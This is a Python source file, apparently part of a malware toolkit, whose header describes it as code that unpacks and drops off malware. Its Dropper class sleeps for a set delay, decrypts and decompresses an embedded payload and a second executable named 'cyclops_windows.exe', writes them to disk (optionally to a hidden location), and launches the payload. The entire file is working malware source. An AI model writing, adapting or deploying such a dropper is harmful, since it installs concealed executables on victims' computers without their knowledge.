# Date: 08/31/2018
# Author: Pure-L0G1C
# Description: Unpacks and drops off malware

import os
import zlib
from time import sleep
from lib.file import File
from lib.aes import CryptoAES
from lib.pathfinder import Finder


class Dropper(object):

    def __init__(self, name, binary, key, delay, cyclops, hide=False):
        self.key = key
        self.path = None
        self.name = name
        self.hide = hide
        self.delay = delay
        self.binary = binary
        self.cyclops = cyclops

    def unpack(self):
        self.path = Finder.find() + self.name if self.hide else self.name
        print('Path1:', self.path)

        # Payload
        data = zlib.decompress(CryptoAES.decrypt(self.binary, self.key))
        File.write(self.path, data)

        # Cyclops
        path = os.path.join(os.path.split(self.path)[0], 'cyclops_windows.exe')
        print('Path2:', path)

        data = zlib.decompress(CryptoAES.decrypt(self.cyclops, self.key))
        File.write(path, data)

    def execute(self):
        from subprocess import Popen
        cmd = '{}'.format(self.path)
        Popen(cmd.split())

    def start(self):
        sleep(self.delay)
        self.unpack()
        self.execute()


if __name__ == '__main__':
    Dropper(data_name, data_binary, data_key,
            data_delay, task_cyclops, data_hide).start()
